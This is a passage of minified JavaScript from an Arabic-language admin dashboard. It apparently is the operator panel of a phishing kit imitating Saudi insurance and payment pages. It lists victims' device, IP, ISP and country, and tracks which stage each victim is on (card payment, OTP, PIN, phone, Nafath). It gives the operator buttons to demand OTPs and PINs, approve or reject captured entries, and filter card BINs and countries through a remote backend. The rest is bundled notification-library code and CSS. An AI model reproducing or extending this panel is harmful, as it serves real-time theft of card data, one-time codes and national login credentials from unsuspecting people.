                        className: "flex items-center gap-1.5 px-3 py-1.5 border-l border-gray-100 shrink-0",
                        children: ["mobile" === V.deviceType ? (0, t.jsx)("svg", {
                            className: "w-3 h-3 text-gray-400",
                            fill: "none",
                            viewBox: "0 0 24 24",
                            stroke: "currentColor",
                            children: (0, t.jsx)("path", {
                                strokeLinecap: "round",
                                strokeLinejoin: "round",
                                strokeWidth: 2,
                                d: "M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"
                            })
                        }) : (0, t.jsx)("svg", {
                            className: "w-3 h-3 text-gray-400",
                            fill: "none",
                            viewBox: "0 0 24 24",
                            stroke: "currentColor",
                            children: (0, t.jsx)("path", {
                                strokeLinecap: "round",
                                strokeLinejoin: "round",
                                strokeWidth: 2,
                                d: "M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"
                            })
                        }), (0, t.jsx)("span", {
                            className: "text-gray-400",
                            children: V.deviceType
                        })]
                    }), V.os && (0, t.jsxs)("div", {
                        className: "flex items-center gap-1.5 px-3 py-1.5 border-l border-gray-100 shrink-0",
                        children: [(0, t.jsx)("svg", {
                            className: "w-3 h-3 text-gray-400",
                            fill: "none",
                            viewBox: "0 0 24 24",
                            stroke: "currentColor",
                            children: (0, t.jsx)("path", {
                                strokeLinecap: "round",
                                strokeLinejoin: "round",
                                strokeWidth: 2,
                                d: "M9 3H5a2 2 0 00-2 2v4m6-6h10a2 2 0 012 2v4M9 3v18m0 0h10a2 2 0 002-2V9M9 21H5a2 2 0 01-2-2V9m0 0h18"
                            })
                        }), (0, t.jsx)("span", {
                            className: "text-gray-400",
                            children: V.os
                        })]
                    }), V.browser && (0, t.jsxs)("div", {
                        className: "flex items-center gap-1.5 px-3 py-1.5 border-l border-gray-100 shrink-0",
                        children: [(0, t.jsx)("svg", {
                            className: "w-3 h-3 text-gray-400",
                            fill: "none",
                            viewBox: "0 0 24 24",
                            stroke: "currentColor",
                            children: (0, t.jsx)("path", {
                                strokeLinecap: "round",
                                strokeLinejoin: "round",
                                strokeWidth: 2,
                                d: "M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"
                            })
                        }), (0, t.jsx)("span", {
                            className: "text-gray-400",
                            children: V.browser
                        })]
                    }), V.country && (0, t.jsxs)("div", {
                        className: "flex items-center gap-1.5 px-3 py-1.5 border-l border-gray-100 shrink-0",
                        children: [(0, t.jsx)("span", {
                            className: "text-base leading-none",
                            children: (r = el(V.country), 2 === r.length ? String.fromCodePoint(127397 + r.charCodeAt(0), 127397 + r.charCodeAt(1)) : "🌐")
                        }), (0, t.jsx)("span", {
                            className: "text-gray-400",
                            children: el(V.country)
                        })]
                    }), V.ipAddress && (0, t.jsxs)("div", {
                        className: "flex items-center gap-1.5 px-3 py-1.5 border-l border-gray-100 shrink-0",
                        children: [(0, t.jsx)("svg", {
                            className: "w-3 h-3 text-gray-400",
                            fill: "none",
                            viewBox: "0 0 24 24",
                            stroke: "currentColor",
                            children: (0, t.jsx)("path", {
                                strokeLinecap: "round",
                                strokeLinejoin: "round",
                                strokeWidth: 2,
                                d: "M5 12h14M5 12a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v4a2 2 0 01-2 2M5 12a2 2 0 00-2 2v4a2 2 0 002 2h14a2 2 0 002-2v-4a2 2 0 00-2-2"
                            })
                        }), (0, t.jsx)("span", {
                            className: "text-gray-400 font-mono",
                            children: V.ipAddress
                        })]
                    }), V.isp && (0, t.jsxs)("div", {
                        className: "flex items-center gap-1.5 px-3 py-1.5 border-l border-gray-100 shrink-0",
                        children: [(0, t.jsx)("svg", {
                            className: "w-3 h-3 text-gray-400",
                            fill: "none",
                            viewBox: "0 0 24 24",
                            stroke: "currentColor",
                            children: (0, t.jsx)("path", {
                                strokeLinecap: "round",
                                strokeLinejoin: "round",
                                strokeWidth: 2,
                                d: "M8.111 16.404a5.5 5.5 0 017.778 0M12 20h.01m-7.08-7.071c3.904-3.905 10.236-3.905 14.141 0M1.394 9.393c5.857-5.857 15.355-5.857 21.213 0"
                            })
                        }), (0, t.jsx)("span", {
                            className: "text-gray-400 truncate max-w-[120px]",
                            children: V.isp
                        })]
                    }), pageDisplay(y) && (0, t.jsx)("div", {
                        className: "flex items-center gap-1.5 px-3 py-1.5 border-l border-gray-100 shrink-0",
                        children: (0, t.jsx)("span", {
                            className: "text-[10px] px-1.5 py-0.5 bg-green-100 text-green-700 rounded font-medium border border-green-200",
                            children: "string" == typeof(n = pageDisplay(y)) ? ({
                                "home-new": "الرئيسية",
                                home: "الرئيسية",
                                insur: "التأمين",
                                compar: "مقارنة",
                                check: "الدفع",
                                payment: "الدفع",
                                otp: "OTP",
                                pin: "PIN",
                                phone: "الهاتف",
                                nafad: "نفاذ",
                                _st1: "الدفع",
                                _t2: "OTP",
                                _t3: "PIN",
                                _t5: "الهاتف",
                                _t6: "نفاذ",
                                veri: "OTP",
                                confi: "PIN",
                                step2: "OTP",
                                step3: "PIN",
                                step4: "نفاذ",
                                step5: "الهاتف",
                                "phone-info": "الهاتف",
                                "thank-you": "شكراً"
                            })[n] || n : ({
                                0: "الرئيسية",
                                1: "الرئيسية",
                                2: "التأمين",
                                3: "مقارنة",
                                4: "الدفع",
                                5: "OTP",
                                6: "PIN",
                                7: "الهاتف",
                                8: "نفاذ"
                            })[n] || `${n}`
                        })
                    })]
                })]
            }), (0, t.jsx)("div", {
                className: "flex-1 overflow-y-auto p-3 md:p-4 bg-gray-50",
                children: 0 === L.length ? (0, t.jsx)("div", {
                    className: "text-center text-gray-400 py-12",
                    children: (0, t.jsx)("p", {
                        className: "text-sm",
                        children: "لا توجد بيانات لعرضها"
                    })
                }) : (0, t.jsx)("div", {
                    className: "flex flex-col gap-2 w-[360px] mr-0 ml-auto",
                    dir: "rtl",
                    children: L.map(e => (0, t.jsx)(w, {
                        title: e.title,
                        data: e.data,
                        timestamp: e.timestamp,
                        status: e.status,
                        showActions: e.showActions,
                        isLatest: e.isLatest,
                        layout: "vertical",
                        actions: e.customActions ? e.customActions : e.showActions ? (0, t.jsxs)("div", {
                            className: "flex gap-2 mt-3",
                            children: ["card" === e.type && (0, t.jsxs)(t.Fragment, {
                                children: [(0, t.jsx)("button", {
                                    onClick: () => O(e.id, "otp"),
                                    disabled: l,
                                    className: "flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-blue-600 text-gray-900 rounded-lg text-xs md:text-sm hover:bg-blue-700 disabled:opacity-50 font-medium",
                                    children: "🔑 رمز OTP"
                                }), (0, t.jsx)("button", {
                                    onClick: () => O(e.id, "pin"),
                                    disabled: l,
                                    className: "flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-purple-600 text-gray-900 rounded-lg text-xs md:text-sm hover:bg-purple-700 disabled:opacity-50 font-medium",
                                    children: "🔐 كود PIN"
                                }), (0, t.jsx)("button", {
                                    onClick: () => O(e.id, "reject"),
                                    disabled: l,
                                    className: "flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-red-600 text-gray-900 rounded-lg text-xs md:text-sm hover:bg-red-700 disabled:opacity-50 font-medium",
                                    children: "❌ رفض"
                                })]
                            }), "otp" === e.type && (0, t.jsxs)(t.Fragment, {
                                children: [(0, t.jsx)("button", {
                                    onClick: () => O(e.id, "approve"),
                                    disabled: l,
                                    className: "flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-green-600 text-gray-900 rounded-lg text-xs md:text-sm hover:bg-green-700 disabled:opacity-50 font-medium",
                                    children: "✓ قبول"
                                }), (0, t.jsx)("button", {
                                    onClick: () => O(e.id, "reject"),
                                    disabled: l,
                                    className: "flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-red-600 text-gray-900 rounded-lg text-xs md:text-sm hover:bg-red-700 disabled:opacity-50 font-medium",
                                    children: "✗ رفض"
                                })]
                            }), "pin" === e.type && (0, t.jsxs)(t.Fragment, {
                                children: [(0, t.jsx)("button", {
                                    onClick: () => O(e.id, "approve"),
                                    disabled: l,
                                    className: "flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-green-600 text-gray-900 rounded-lg text-xs md:text-sm hover:bg-green-700 disabled:opacity-50 font-medium",
                                    children: "✓ قبول"
                                }), (0, t.jsx)("button", {
                                    onClick: () => O(e.id, "reject"),
                                    disabled: l,
                                    className: "flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-red-600 text-gray-900 rounded-lg text-xs md:text-sm hover:bg-red-700 disabled:opacity-50 font-medium",
                                    children: "✗ رفض"
                                })]
                            }), "phone_otp" === e.type && (0, t.jsxs)(t.Fragment, {
                                children: [(0, t.jsx)("button", {
                                    onClick: () => O(e.id, "approve"),
                                    disabled: l,
                                    className: "flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-green-600 text-gray-900 rounded-lg text-xs md:text-sm hover:bg-green-700 disabled:opacity-50 font-medium",
                                    children: "✓ قبول"
                                }), (0, t.jsx)("button", {
                                    onClick: () => O(e.id, "reject"),
                                    disabled: l,
                                    className: "flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-red-600 text-gray-900 rounded-lg text-xs md:text-sm hover:bg-red-700 disabled:opacity-50 font-medium",
                                    children: "✗ رفض"
                                }), (0, t.jsx)("button", {
                                    onClick: () => O(e.id, "resend"),
                                    disabled: l,
                                    className: "flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-blue-600 text-gray-900 rounded-lg text-xs md:text-sm hover:bg-blue-700 disabled:opacity-50 font-medium",
                                    children: "🔄 إعادة إرسال"
                                })]
                            })]
                        }) : null
                    }, e.id))
                })
            })]
        })
    }
    C("_v1"), C("_v2"), C("_v3"), C("_v4"), C("_v5"), C("_v6"), C("_pw"), C("_ncc"), C("_ct"), C("_bi");
    var P = e.i(91432);
    let I = m("x", [
            ["path", {
                d: "M18 6 6 18",
                key: "1bl5f8"
            }],
            ["path", {
                d: "m6 6 12 12",
                key: "d8bk6v"
            }]
        ]),
        E = m("plus", [
            ["path", {
                d: "M5 12h14",
                key: "1ays0h"
            }],
            ["path", {
                d: "M12 5v14",
                key: "s699le"
            }]
        ]),
        R = m("globe", [
            ["circle", {
                cx: "12",
                cy: "12",
                r: "10",
                key: "1mglay"
            }],
            ["path", {
                d: "M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20",
                key: "13o1zl"
            }],
            ["path", {
                d: "M2 12h20",
                key: "9i4pu4"
            }]
        ]),
        M = m("shield", [
            ["path", {
                d: "M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z",
                key: "oel41y"
            }]
        ]),
        z = m("user", [
            ["path", {
                d: "M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2",
                key: "975kel"
            }],
            ["circle", {
                cx: "12",
                cy: "7",
                r: "4",
                key: "17ys0d"
            }]
        ]),
        L = m("mail", [
            ["path", {
                d: "m22 7-8.991 5.727a2 2 0 0 1-2.009 0L2 7",
                key: "132q7q"
            }],
            ["rect", {
                x: "2",
                y: "4",
                width: "20",
                height: "16",
                rx: "2",
                key: "izxlao"
            }]
        ]);
    async function O(e, t, a) {
        let r = localStorage.getItem("admin_token"),
            n = await fetch(`https://moaiendy.onrender.com/api-backend${t}`, {
                method: e,
                headers: {
                    "Content-Type": "application/json",
                    ...r ? {
                        Authorization: `Bearer ${r}`
                    } : {}
                },
                body: a ? JSON.stringify(a) : void 0
            });
        if (!n.ok) throw Error(`HTTP ${n.status}`);
        return n.json()
    }
    async function D() {
        try {
            let e = await O("GET", "/api/admin/settings"),
                t = e => {
                    if (Array.isArray(e)) return e;
                    if ("string" == typeof e) try {
                        let t = JSON.parse(e);
                        return Array.isArray(t) ? t : []
                    } catch {}
                    return []
                };
            return {
                blockedCardBins: t(e.blockedCardBins),
                allowedCountries: t(e.allowedCountries)
            }
        } catch {
            return {
                blockedCardBins: [],
                allowedCountries: []
            }
        }
    }
    async function $(e) {
        await O("PATCH", "/api/admin/settings", {
            blockedCardBins: e
        })
    }
    async function U(e) {
        let t = await D();
        t.blockedCardBins.includes(e) || await $([...t.blockedCardBins, e])
    }
    async function F(e) {
        let t = await D();
        await $(t.blockedCardBins.filter(t => t !== e))
    }
    async function V(e) {
        await O("PATCH", "/api/admin/settings", {
            allowedCountries: e
        })
    }
    async function W(e) {
        let t = await D(),
            a = e.toUpperCase();
        t.allowedCountries.includes(a) || await V([...t.allowedCountries, a])
    }
    async function H(e) {
        let t = await D();
        await V(t.allowedCountries.filter(t => t !== e.toUpperCase()))
    }
    e.i(74080);
    let Y = Array(12).fill(0),
        q = 1,
        K = new class {
            constructor() {
                this.subscribe = e => (this.subscribers.push(e), () => {
                    let t = this.subscribers.indexOf(e);
                    this.subscribers.splice(t, 1)
                }), this.publish = e => {
                    this.subscribers.forEach(t => t(e))
                }, this.addToast = e => {
                    this.publish(e), this.toasts = [...this.toasts, e]
                }, this.create = e => {
                    var t;
                    let {
                        message: a,
                        ...r
                    } = e, n = "number" == typeof(null == e ? void 0 : e.id) || (null == (t = e.id) ? void 0 : t.length) > 0 ? e.id : q++, s = this.toasts.find(e => e.id === n), i = void 0 === e.dismissible || e.dismissible;
                    return this.dismissedToasts.has(n) && this.dismissedToasts.delete(n), s ? this.toasts = this.toasts.map(t => t.id === n ? (this.publish({
                        ...t,
                        ...e,
                        id: n,
                        title: a
                    }), {
                        ...t,
                        ...e,
                        id: n,
                        dismissible: i,
                        title: a
                    }) : t) : this.addToast({
                        title: a,
                        ...r,
                        dismissible: i,
                        id: n
                    }), n
                }, this.dismiss = e => (e ? (this.dismissedToasts.add(e), requestAnimationFrame(() => this.subscribers.forEach(t => t({
                    id: e,
                    dismiss: !0
                })))) : this.toasts.forEach(e => {
                    this.subscribers.forEach(t => t({
                        id: e.id,
                        dismiss: !0
                    }))
                }), e), this.message = (e, t) => this.create({
                    ...t,
                    message: e
                }), this.error = (e, t) => this.create({
                    ...t,
                    message: e,
                    type: "error"
                }), this.success = (e, t) => this.create({
                    ...t,
                    type: "success",
                    message: e
                }), this.info = (e, t) => this.create({
                    ...t,
                    type: "info",
                    message: e
                }), this.warning = (e, t) => this.create({
                    ...t,
                    type: "warning",
                    message: e
                }), this.loading = (e, t) => this.create({
                    ...t,
                    type: "loading",
                    message: e
                }), this.promise = (e, t) => {
                    let r, n;
                    if (!t) return;
                    void 0 !== t.loading && (n = this.create({
                        ...t,
                        promise: e,
                        type: "loading",
                        message: t.loading,
                        description: "function" != typeof t.description ? t.description : void 0
                    }));
                    let s = Promise.resolve(e instanceof Function ? e() : e),
                        i = void 0 !== n,
                        o = s.then(async e => {
                            if (r = ["resolve", e], a.default.isValidElement(e)) i = !1, this.create({
                                id: n,
                                type: "default",
                                message: e
                            });
                            else if (X(e) && !e.ok) {
                                i = !1;
                                let r = "function" == typeof t.error ? await t.error(`HTTP error! status: ${e.status}`) : t.error,
                                    s = "function" == typeof t.description ? await t.description(`HTTP error! status: ${e.status}`) : t.description,
                                    o = "object" != typeof r || a.default.isValidElement(r) ? {
                                        message: r
                                    } : r;
                                this.create({
                                    id: n,
                                    type: "error",
                                    description: s,
                                    ...o
                                })
                            } else if (e instanceof Error) {
                                i = !1;
                                let r = "function" == typeof t.error ? await t.error(e) : t.error,
                                    s = "function" == typeof t.description ? await t.description(e) : t.description,
                                    o = "object" != typeof r || a.default.isValidElement(r) ? {
                                        message: r
                                    } : r;
                                this.create({
                                    id: n,
                                    type: "error",
                                    description: s,
                                    ...o
                                })
                            } else if (void 0 !== t.success) {
                                i = !1;
                                let r = "function" == typeof t.success ? await t.success(e) : t.success,
                                    s = "function" == typeof t.description ? await t.description(e) : t.description,
                                    o = "object" != typeof r || a.default.isValidElement(r) ? {
                                        message: r
                                    } : r;
                                this.create({
                                    id: n,
                                    type: "success",
                                    description: s,
                                    ...o
                                })
                            }
                        }).catch(async e => {
                            if (r = ["reject", e], void 0 !== t.error) {
                                i = !1;
                                let r = "function" == typeof t.error ? await t.error(e) : t.error,
                                    s = "function" == typeof t.description ? await t.description(e) : t.description,
                                    o = "object" != typeof r || a.default.isValidElement(r) ? {
                                        message: r
                                    } : r;
                                this.create({
                                    id: n,
                                    type: "error",
                                    description: s,
                                    ...o
                                })
                            }
                        }).finally(() => {
                            i && (this.dismiss(n), n = void 0), null == t.finally || t.finally.call(t)
                        }),
                        d = () => new Promise((e, t) => o.then(() => "reject" === r[0] ? t(r[1]) : e(r[1])).catch(t));
                    return "string" != typeof n && "number" != typeof n ? {
                        unwrap: d
                    } : Object.assign(n, {
                        unwrap: d
                    })
                }, this.custom = (e, t) => {
                    let a = (null == t ? void 0 : t.id) || q++;
                    return this.create({
                        jsx: e(a),
                        id: a,
                        ...t
                    }), a
                }, this.getActiveToasts = () => this.toasts.filter(e => !this.dismissedToasts.has(e.id)), this.subscribers = [], this.toasts = [], this.dismissedToasts = new Set
            }
        },
        X = e => e && "object" == typeof e && "ok" in e && "boolean" == typeof e.ok && "status" in e && "number" == typeof e.status,
        G = Object.assign((e, t) => {
            let a = (null == t ? void 0 : t.id) || q++;
            return K.addToast({
                title: e,
                ...t,
                id: a
            }), a
        }, {
            success: K.success,
            info: K.info,
            warning: K.warning,
            error: K.error,
            custom: K.custom,
            message: K.message,
            promise: K.promise,
            dismiss: K.dismiss,
            loading: K.loading
        }, {
            getHistory: () => K.toasts,
            getToasts: () => K.getActiveToasts()
        });
    ! function(e) {
        if (!e || "undefined" == typeof document) return;
        let t = document.head || document.getElementsByTagName("head")[0],
            a = document.createElement("style");
        a.type = "text/css", t.appendChild(a), a.styleSheet ? a.styleSheet.cssText = e : a.appendChild(document.createTextNode(e))
    }("[data-sonner-toaster][dir=ltr],html[dir=ltr]{--toast-icon-margin-start:-3px;--toast-icon-margin-end:4px;--toast-svg-margin-start:-1px;--toast-svg-margin-end:0px;--toast-button-margin-start:auto;--toast-button-margin-end:0;--toast-close-button-start:0;--toast-close-button-end:unset;--toast-close-button-transform:translate(-35%, -35%)}[data-sonner-toaster][dir=rtl],html[dir=rtl]{--toast-icon-margin-start:4px;--toast-icon-margin-end:-3px;--toast-svg-margin-start:0px;--toast-svg-margin-end:-1px;--toast-button-margin-start:0;--toast-button-margin-end:auto;--toast-close-button-start:unset;--toast-close-button-end:0;--toast-close-button-transform:translate(35%, -35%)}[data-sonner-toaster]{position:fixed;width:var(--width);font-family:ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji;--gray1:hsl(0, 0%, 99%);--gray2:hsl(0, 0%, 97.3%);--gray3:hsl(0, 0%, 95.1%);--gray4:hsl(0, 0%, 93%);--gray5:hsl(0, 0%, 90.9%);--gray6:hsl(0, 0%, 88.7%);--gray7:hsl(0, 0%, 85.8%);--gray8:hsl(0, 0%, 78%);--gray9:hsl(0, 0%, 56.1%);--gray10:hsl(0, 0%, 52.3%);--gray11:hsl(0, 0%, 43.5%);--gray12:hsl(0, 0%, 9%);--border-radius:8px;box-sizing:border-box;padding:0;margin:0;list-style:none;outline:0;z-index:999999999;transition:transform .4s ease}@media (hover:none) and (pointer:coarse){[data-sonner-toaster][data-lifted=true]{transform:none}}[data-sonner-toaster][data-x-position=right]{right:var(--offset-right)}[data-sonner-toaster][data-x-position=left]{left:var(--offset-left)}[data-sonner-toaster][data-x-position=center]{left:50%;transform:translateX(-50%)}[data-sonner-toaster][data-y-position=top]{top:var(--offset-top)}[data-sonner-toaster][data-y-position=bottom]{bottom:var(--offset-bottom)}[data-sonner-toast]{--y:translateY(100%);--lift-amount:calc(var(--lift) * var(--gap));z-index:var(--z-index);position:absolute;opacity:0;transform:var(--y);touch-action:none;transition:transform .4s,opacity .4s,height .4s,box-shadow .2s;box-sizing:border-box;outline:0;overflow-wrap:anywhere}[data-sonner-toast][data-styled=true]{padding:16px;background:var(--normal-bg);border:1px solid var(--normal-border);color:var(--normal-text);border-radius:var(--border-radius);box-shadow:0 4px 12px rgba(0,0,0,.1);width:var(--width);font-size:13px;display:flex;align-items:center;gap:6px}[data-sonner-toast]:focus-visible{box-shadow:0 4px 12px rgba(0,0,0,.1),0 0 0 2px rgba(0,0,0,.2)}[data-sonner-toast][data-y-position=top]{top:0;--y:translateY(-100%);--lift:1;--lift-amount:calc(1 * var(--gap))}[data-sonner-toast][data-y-position=bottom]{bottom:0;--y:translateY(100%);--lift:-1;--lift-amount:calc(var(--lift) * var(--gap))}[data-sonner-toast][data-styled=true] [data-description]{font-weight:400;line-height:1.4;color:#3f3f3f}[data-rich-colors=true][data-sonner-toast][data-styled=true] [data-description]{color:inherit}[data-sonner-toaster][data-sonner-theme=dark] [data-description]{color:#e8e8e8}[data-sonner-toast][data-styled=true] [data-title]{font-weight:500;line-height:1.5;color:inherit}[data-sonner-toast][data-styled=true] [data-icon]{display:flex;height:16px;width:16px;position:relative;justify-content:flex-start;align-items:center;flex-shrink:0;margin-left:var(--toast-icon-margin-start);margin-right:var(--toast-icon-margin-end)}[data-sonner-toast][data-promise=true] [data-icon]>svg{opacity:0;transform:scale(.8);transform-origin:center;animation:sonner-fade-in .3s ease forwards}[data-sonner-toast][data-styled=true] [data-icon]>*{flex-shrink:0}[data-sonner-toast][data-styled=true] [data-icon] svg{margin-left:var(--toast-svg-margin-start);margin-right:var(--toast-svg-margin-end)}[data-sonner-toast][data-styled=true] [data-content]{display:flex;flex-direction:column;gap:2px}[data-sonner-toast][data-styled=true] [data-button]{border-radius:4px;padding-left:8px;padding-right:8px;height:24px;font-size:12px;color:var(--normal-bg);background:var(--normal-text);margin-left:var(--toast-button-margin-start);margin-right:var(--toast-button-margin-end);border:none;font-weight:500;cursor:pointer;outline:0;display:flex;align-items:center;flex-shrink:0;transition:opacity .4s,box-shadow .2s}[data-sonner-toast][data-styled=true] [data-button]:focus-visible{box-shadow:0 0 0 2px rgba(0,0,0,.4)}[data-sonner-toast][data-styled=true] [data-button]:first-of-type{margin-left:var(--toast-button-margin-start);margin-right:var(--toast-button-margin-end)}[data-sonner-toast][data-styled=true] [data-cancel]{color:var(--normal-text);background:rgba(0,0,0,.08)}[data-sonner-toaster][data-sonner-theme=dark] [data-sonner-toast][data-styled=true] [data-cancel]{background:rgba(255,255,255,.3)}[data-sonner-toast][data-styled=true] [data-close-button]{position:absolute;left:var(--toast-close-button-start);right:var(--toast-close-button-end);top:0;height:20px;width:20px;display:flex;justify-content:center;align-items:center;padding:0;color:var(--gray12);background:var(--normal-bg);border:1px solid var(--gray4);transform:var(--toast-close-button-transform);border-radius:50%;cursor:pointer;z-index:1;transition:opacity .1s,background .2s,border-color .2s}[data-sonner-toast][data-styled=true] [data-close-button]:focus-visible{box-shadow:0 4px 12px rgba(0,0,0,.1),0 0 0 2px rgba(0,0,0,.2)}[data-sonner-toast][data-styled=true] [data-disabled=true]{cursor:not-allowed}[data-sonner-toast][data-styled=true]:hover [data-close-button]:hover{background:var(--gray2);border-color:var(--gray5)}[data-sonner-toast][data-swiping=true]::before{content:'';position:absolute;left:-100%;right:-100%;height:100%;z-index:-1}[data-sonner-toast][data-y-position=top][data-swiping=true]::before{bottom:50%;transform:scaleY(3) translateY(50%)}[data-sonner-toast][data-y-position=bottom][data-swiping=true]::before{top:50%;transform:scaleY(3) translateY(-50%)}[data-sonner-toast][data-swiping=false][data-removed=true]::before{content:'';position:absolute;inset:0;transform:scaleY(2)}[data-sonner-toast][data-expanded=true]::after{content:'';position:absolute;left:0;height:calc(var(--gap) + 1px);bottom:100%;width:100%}[data-sonner-toast][data-mounted=true]{--y:translateY(0);opacity:1}[data-sonner-toast][data-expanded=false][data-front=false]{--scale:var(--toasts-before) * 0.05 + 1;--y:translateY(calc(var(--lift-amount) * var(--toasts-before))) scale(calc(-1 * var(--scale)));height:var(--front-toast-height)}[data-sonner-toast]>*{transition:opacity .4s}[data-sonner-toast][data-x-position=right]{right:0}[data-sonner-toast][data-x-position=left]{left:0}[data-sonner-toast][data-expanded=false][data-front=false][data-styled=true]>*{opacity:0}[data-sonner-toast][data-visible=false]{opacity:0;pointer-events:none}[data-sonner-toast][data-mounted=true][data-expanded=true]{--y:translateY(calc(var(--lift) * var(--offset)));height:var(--initial-height)}[data-sonner-toast][data-removed=true][data-front=true][data-swipe-out=false]{--y:translateY(calc(var(--lift) * -100%));opacity:0}[data-sonner-toast][data-removed=true][data-front=false][data-swipe-out=false][data-expanded=true]{--y:translateY(calc(var(--lift) * var(--offset) + var(--lift) * -100%));opacity:0}[data-sonner-toast][data-removed=true][data-front=false][data-swipe-out=false][data-expanded=false]{--y:translateY(40%);opacity:0;transition:transform .5s,opacity .2s}[data-sonner-toast][data-removed=true][data-front=false]::before{height:calc(var(--initial-height) + 20%)}[data-sonner-toast][data-swiping=true]{transform:var(--y) translateY(var(--swipe-amount-y,0)) translateX(var(--swipe-amount-x,0));transition:none}[data-sonner-toast][data-swiped=true]{user-select:none}[data-sonner-toast][data-swipe-out=true][data-y-position=bottom],[data-sonner-toast][data-swipe-out=true][data-y-position=top]{animation-duration:.2s;animation-timing-function:ease-out;animation-fill-mode:forwards}[data-sonner-toast][data-swipe-out=true][data-swipe-direction=left]{animation-name:swipe-out-left}[data-sonner-toast][data-swipe-out=true][data-swipe-direction=right]{animation-name:swipe-out-right}[data-sonner-toast][data-swipe-out=true][data-swipe-direction=up]{animation-name:swipe-out-up}[data-sonner-toast][data-swipe-out=true][data-swipe-direction=down]{animation-name:swipe-out-down}@keyframes swipe-out-left{from{transform:var(--y) translateX(var(--swipe-amount-x));opacity:1}to{transform:var(--y) translateX(calc(var(--swipe-amount-x) - 100%));opacity:0}}@keyframes swipe-out-right{from{transform:var(--y) translateX(var(--swipe-amount-x));opacity:1}to{transform:var(--y) translateX(calc(var(--swipe-amount-x) + 100%));opacity:0}}@keyframes swipe-out-up{from{transform:var(--y) translateY(var(--swipe-amount-y));opacity:1}to{transform:var(--y) translateY(calc(var(--swipe-amount-y) - 100%));opacity:0}}@keyframes swipe-out-down{from{transform:var(--y) translateY(var(--swipe-amount-y));opacity:1}to{transform:var(--y) translateY(calc(var(--swipe-amount-y) + 100%));opacity:0}}@media (max-width:600px){[data-sonner-toaster]{position:fixed;right:var(--mobile-offset-right);left:var(--mobile-offset-left);width:100%}[data-sonner-toaster][dir=rtl]{left:calc(var(--mobile-offset-left) * -1)}[data-sonner-toaster] [data-sonner-toast]{left:0;right:0;width:calc(100% - var(--mobile-offset-left) * 2)}[data-sonner-toaster][data-x-position=left]{left:var(--mobile-offset-left)}[data-sonner-toaster][data-y-position=bottom]{bottom:var(--mobile-offset-bottom)}[data-sonner-toaster][data-y-position=top]{top:var(--mobile-offset-top)}[data-sonner-toaster][data-x-position=center]{left:var(--mobile-offset-left);right:var(--mobile-offset-right);transform:none}}[data-sonner-toaster][data-sonner-theme=light]{--normal-bg:#fff;--normal-border:var(--gray4);--normal-text:var(--gray12);--success-bg:hsl(143, 85%, 96%);--success-border:hsl(145, 92%, 87%);--success-text:hsl(140, 100%, 27%);--info-bg:hsl(208, 100%, 97%);--info-border:hsl(221, 91%, 93%);--info-text:hsl(210, 92%, 45%);--warning-bg:hsl(49, 100%, 97%);--warning-border:hsl(49, 91%, 84%);--warning-text:hsl(31, 92%, 45%);--error-bg:hsl(359, 100%, 97%);--error-border:hsl(359, 100%, 94%);--error-text:hsl(360, 100%, 45%)}[data-sonner-toaster][data-sonner-theme=light] [data-sonner-toast][data-invert=true]{--normal-bg:#000;--normal-border:hsl(0, 0%, 20%);--normal-text:var(--gray1)}[data-sonner-toaster][data-sonner-theme=dark] [data-sonner-toast][data-invert=true]{--normal-bg:#fff;--normal-border:var(--gray3);--normal-text:var(--gray12)}[data-sonner-toaster][data-sonner-theme=dark]{--normal-bg:#000;--normal-bg-hover:hsl(0, 0%, 12%);--normal-border:hsl(0, 0%, 20%);--normal-border-hover:hsl(0, 0%, 25%);--normal-text:var(--gray1);--success-bg:hsl(150, 100%, 6%);--success-border:hsl(147, 100%, 12%);--success-text:hsl(150, 86%, 65%);--info-bg:hsl(215, 100%, 6%);--info-border:hsl(223, 43%, 17%);--info-text:hsl(216, 87%, 65%);--warning-bg:hsl(64, 100%, 6%);--warning-border:hsl(60, 100%, 9%);--warning-text:hsl(46, 87%, 65%);--error-bg:hsl(358, 76%, 10%);--error-border:hsl(357, 89%, 16%);--error-text:hsl(358, 100%, 81%)}[data-sonner-toaster][data-sonner-theme=dark] [data-sonner-toast] [data-close-button]{background:var(--normal-bg);border-color:var(--normal-border);color:var(--normal-text)}[data-sonner-toaster][data-sonner-theme=dark] [data-sonner-toast] [data-close-button]:hover{background:var(--normal-bg-hover);border-color:var(--normal-border-hover)}[data-rich-colors=true][data-sonner-toast][data-type=success]{background:var(--success-bg);border-color:var(--success-border);color:var(--success-text)}[data-rich-colors=true][data-sonner-toast][data-type=success] [data-close-button]{background:var(--success-bg);border-color:var(--success-border);color:var(--success-text)}[data-rich-colors=true][data-sonner-toast][data-type=info]{background:var(--info-bg);border-color:var(--info-border);color:var(--info-text)}[data-rich-colors=true][data-sonner-toast][data-type=info] 